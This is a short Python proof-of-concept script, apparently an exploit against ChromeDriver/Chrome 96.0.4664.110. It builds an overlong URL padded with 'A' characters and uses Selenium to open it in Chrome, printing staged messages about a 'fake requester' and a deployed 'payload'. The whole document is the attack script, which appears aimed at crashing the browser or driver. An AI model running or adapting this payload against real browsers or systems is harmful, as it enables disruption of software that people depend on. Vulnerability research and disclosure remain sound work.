#!/usr/bin/python3
# Author: @nu11secur1ty
# Debug and Developement: @nu11secur1ty 

from selenium import webdriver
import requests
import time
from colorama import init, Fore, Back, Style
init(convert=True)

#enter the link to the website you want to automate login.
proto="https://"
payload="AAAAAAAAAAAAAAAAAAAAAAAAAA\
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
	.com/login.php"
print(Fore.GREEN +"The fake requester is sent to ChromeDriver=96.0.4664.110...\n")
print(Fore.GREEN +"Please wait...\n")
print(Style.RESET_ALL)

time.sleep(7)
print(Fore.BLUE +"The payload for chrome=96.0.4664.110 Stacktrace testing is deployed...\n")
print(Style.RESET_ALL)

print('Press any key to finish and see the result...')
input()

print(Fore.YELLOW +"The result\n")
print(Style.RESET_ALL)
print(Fore.RED)
browser = webdriver.Chrome()
browser.get((proto + payload))	
print(Style.RESET_ALL)
